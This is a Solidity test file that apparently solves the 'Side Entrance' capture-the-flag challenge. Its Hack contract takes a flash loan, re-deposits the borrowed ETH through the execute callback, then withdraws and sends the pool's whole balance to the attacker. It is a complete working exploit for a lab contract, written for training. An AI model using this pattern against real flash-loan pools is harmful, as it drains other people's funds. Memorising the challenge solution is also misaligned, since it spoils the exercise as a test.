// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/side-entrance/SideEntranceLenderPool.sol";

import "openzeppelin-contracts/utils/Address.sol";

contract SideEntranceLenderPoolTest is BaseTest {
    // Pool has 1000000 ETH in balance
    uint ETHER_IN_POOL = 1000 ether;

    SideEntranceLenderPool pool;

    address payable attacker;
    uint256 attackerInitialEthBalance;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        pool = new SideEntranceLenderPool();
        vm.label(address(pool), "SideEntranceLenderPool");

        pool.deposit{value: ETHER_IN_POOL}();

        attackerInitialEthBalance = attacker.balance;

        assertEq(address(pool).balance, ETHER_IN_POOL);
    }

    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        Hack hack = new Hack(address(pool), attacker);
        hack.attack(address(pool).balance);
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(address(pool).balance, 0);

        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract Hack is IFlashLoanEtherReceiver {
    address public target;
    address public attacker;

    constructor(address _target, address _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function execute() external payable {
        (bool depositSuccess, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(depositSuccess, "deposit failed");
    }

    function attack(uint256 amount) public {
        SideEntranceLenderPool pool = SideEntranceLenderPool(target);
        pool.flashLoan(amount);
        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {}
}
